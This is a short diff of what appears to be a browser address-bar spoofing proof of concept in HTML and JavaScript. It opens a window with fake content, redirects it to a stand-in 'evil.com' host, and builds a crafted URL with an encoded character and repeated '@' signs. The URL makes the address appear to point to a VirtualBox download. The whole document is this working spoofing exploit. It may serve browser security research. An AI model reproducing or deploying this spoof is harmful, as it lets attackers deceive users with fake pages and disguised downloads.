@@ -3,11 +3,11 @@
  <head>
   <script>
   function next() {
-         w.location.replace('https://127.0.0.1/%D8%A7/google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@download.virtualbox.org/virtualbox/7.0.8/VirtualBox-7.0.8-156879-Win.exe');
+         w.location.replace('https://127.0.0.1%D8%A7google.com@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@download.virtualbox.org/virtualbox/7.0.8/VirtualBox-7.0.8-156879-Win.exe');
         }
 
   function f() {
-    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://google.com'");
+    w = window.open("javascript:document.write('<h1>This is a Fake Content!</h1>');location='http://www.evil.com'");
  
     i = setInterval("try { x = w.location.href; } catch(e) { clearInterval(i); next(); }", 0);
   }
